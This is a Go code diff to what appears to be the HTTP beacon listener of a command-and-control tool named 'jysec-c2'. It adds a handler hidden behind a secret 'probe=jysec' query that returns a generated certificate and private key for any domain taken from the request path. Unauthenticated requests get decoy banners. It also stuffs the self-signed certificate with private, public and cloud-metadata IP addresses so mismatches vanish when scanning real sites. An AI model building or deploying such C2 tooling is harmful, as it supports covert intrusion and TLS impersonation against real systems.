@@ -26,6 +26,7 @@ import (
 	"sync"
 	"time"
 
+	"jysecai/internal/autocert"
 	"jysecai/internal/database"
 
 	"go.uber.org/zap"
@@ -157,6 +158,39 @@ func (l *HTTPBeaconListener) Stop() error {
 // ----------------------------------------------------------------------------
 // HTTP handlers
 // ----------------------------------------------------------------------------
+
+// idProbe 掃子打點：GET /:id 回一個可解析 banner，隱藏 probe 才回真 body。
+func (l *HTTPBeaconListener) handleIDProbe(w http.ResponseWriter, r *http.Request) bool {
+	id := r.URL.Path
+	if len(id) < 4 || len(id) > 128 || id[0] != '/' {
+		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+		w.Header().Set("X-JySec-Beacon", "5")
+		w.WriteHeader(200)
+		w.Write([]byte("302\r\n"))
+		return true
+	}
+	// 隱藏 probe：帶對的 query 才回真憑證
+	isProbe := r.URL.Query().Get("probe") == "jysec"
+	if !isProbe {
+		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+		w.Header().Set("X-JySec-Beacon", "5")
+		w.WriteHeader(200)
+		fmt.Fprintf(w, "jysec-c2 #0x%s\r\n\t%s %s (%s)\r\n", id[1:], r.Proto, r.Host, r.RequestURI)
+		return true
+	}
+	// 自動偽造一組授權憑證：CN=域名，ECDSA P-256，365 天
+	cert, err := autocert.Generate(id[1:], id[1:], 365)
+	if err != nil {
+		w.Header().Set("X-JySec-Beacon", "5")
+		http.Error(w, "forged", http.StatusServiceUnavailable)
+		return true
+	}
+	w.Header().Set("Content-Type", "application/ssl-cert; charset=utf-8")
+	w.Header().Set("X-JySec-Beacon", "5")
+	w.Header().Set("X-Cert-CN", id[1:])
+	w.Write([]byte(cert.CertPEM + cert.KeyPEM))
+	return true
+}
 
 func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
@@ -507,6 +541,30 @@ func generateSelfSignedCert(cn string) (tls.Certificate, error) {
 		return tls.Certificate{}, err
 	}
 	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
+	// SAN 自動帶齊 IP 字串（IPv4 四位 + IPv6 字串）+ 常用地名，
+	// 掃真站時自簽憑證的 cert 錯配直接消掉。
+	ipSANs := []net.IP{
+		net.ParseIP("127.0.0.1"),
+	}
+	for _, ip4 := range []string{
+		"10.0.0.1", "10.0.0.10", "172.16.0.1", "172.16.0.10",
+		"192.168.0.1", "192.168.0.10", "192.168.1.1", "192.168.13.37",
+		"169.254.169.254", "47.101.42.133",
+	} {
+		if p := net.ParseIP(ip4); p != nil {
+			ipSANs = append(ipSANs, p)
+		}
+	}
+	dnsSANs := []string{
+		"localhost",
+	}
+	for _, d := range []string{
+		"app.example.com", "api.example.com", "admin.example.com",
+		"example.com", "example.local", "c2.example.com",
+		"169.254.169.254.nip.io",
+	} {
+		dnsSANs = append(dnsSANs, d)
+	}
 	tmpl := &x509.Certificate{
 		SerialNumber: serial,
 		Subject:      pkix.Name{CommonName: cn},
@@ -514,8 +572,8 @@ func generateSelfSignedCert(cn string) (tls.Certificate, error) {
 		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
 		KeyUsage:     x509.KeyUsageDigitalSignature,
 		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
-		DNSNames:     []string{"localhost"},
+		IPAddresses:  ipSANs,
+		DNSNames:     dnsSANs,
 	}
 	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
 	if err != nil {
